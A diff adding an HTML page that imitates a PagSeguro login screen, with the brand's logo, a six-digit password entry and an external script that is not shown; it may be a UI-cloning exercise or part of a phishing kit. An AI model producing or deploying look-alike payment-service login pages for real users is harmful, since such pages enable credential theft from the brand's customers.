@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <title>Digite Sua Senha</title>
+  </head>
+  <body>
+    <div id="header-img">
+      <img
+        src="./images/logopagseguro.png"
+        alt=""
+        style="width: 120px; position: fixed; margin: -15px -188px"
+      />
+      <img
+        src="./images/sinal-de-interrogacao.png"
+        alt=""
+        style="position: fixed; margin: 0px 152px"
+      />
+    </div>
+    <div style="display: flex">
+      <h1
+        style="
+          font-weight: 500;
+          font-size: 24px;
+          color: #1c1916;
+          margin-right: 85px;
+        "
+      >
+        Acessar Conta
+      </h1>
+      <span id="trocar-conta" style="margin: 22px;font-weight: 500;
+        color: var(--cor--azul);">Trocar conta</span>
+    </div>
+    <div
+      id="linha"
+      style="
+        color: #1c19168a;
+        border: 1px solid;
+        margin-top: 32px;
+        width: 90%;
+        margin-top: -141px;
+      "
+    ></div>
+    <span>Insira sua senha</span>
+    <div class="password-container">
+      <div class="password-box">
+        <input type="password" maxlength="1" class="password-input" />
+        <input type="password" maxlength="1" class="password-input" />
+        <input type="password" maxlength="1" class="password-input" />
+        <input type="password" maxlength="1" class="password-input" />
+        <input type="password" maxlength="1" class="password-input" />
+        <input type="password" maxlength="1" class="password-input" />
+      </div>
+      <div
+        id="versao"
+        style="
+          text-align: center;
+          margin-bottom: 15px;
+          color: #616159;
+          font-size: 14px;
+        "
+      >
+        <span style="margin-right: 44%">Versão 4.113.12</span>
+        <span>ID 347-3a6</span>
+      </div>
+      <button id="toggle-password" class="toggle-password">
+        <i id="eye-icon" class="fa fa-eye"></i>
+      </button>
+    </div>
+    <span>Esqueci a senha</span>
+    <button
+      style="
+        margin-bottom: 10px;
+        height: 40px;
+        width: 360px;
+        border-radius: 20px;
+        background-color: var(--cor--azul);
+        color: white;
+        font-weight: 800;
+        border-color: var(--cor--azul);
+      "
+      id="btn-continuar"
+    >
+      Continuar
+    </button>
+    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+    <script src="script.js"></script>
+  </body>
+</html>
